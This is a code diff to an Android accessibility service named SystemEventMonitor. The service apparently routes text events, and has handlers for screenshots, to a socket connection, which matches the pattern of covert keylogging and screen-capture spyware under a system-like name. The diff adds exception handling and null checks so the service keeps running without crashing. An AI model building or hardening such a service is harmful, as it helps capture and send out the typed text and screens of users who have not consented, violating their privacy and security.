@@ -21,14 +21,25 @@ public class SystemEventMonitor extends AccessibilityService {
     public void onCreate() {
         super.onCreate();
 
-        this.socketManager = new SocketManager(this);
-        this.textEventHandler = new TextEventHandler(socketManager);
-        this.screenShotEventHandler = new ScreenshotEventHandler(this, socketManager);
+        try {
+            this.socketManager = new SocketManager(this);
+            this.textEventHandler = new TextEventHandler(socketManager);
+            this.screenShotEventHandler = new ScreenshotEventHandler(this, socketManager);
+        } catch (Exception e) {
+            // Log error but don't crash the service
+            android.util.Log.e("SystemEventMonitor", "Error initializing components", e);
+        }
     }
 
     @Override
     public void onAccessibilityEvent(AccessibilityEvent event) {
-        textEventHandler.onTextEvent(event);
+        try {
+            if (textEventHandler != null) {
+                textEventHandler.onTextEvent(event);
+            }
+        } catch (Exception e) {
+            android.util.Log.e("SystemEventMonitor", "Error handling accessibility event", e);
+        }
     }
 
     @Override
@@ -37,8 +48,15 @@ public class SystemEventMonitor extends AccessibilityService {
 
     @Override
     public void onDestroy() {
-        socketManager.disconnect();
-        super.onDestroy();
+        try {
+            if (socketManager != null) {
+                socketManager.disconnect();
+            }
+        } catch (Exception e) {
+            android.util.Log.e("SystemEventMonitor", "Error during cleanup", e);
+        } finally {
+            super.onDestroy();
+        }
     }
 
 }
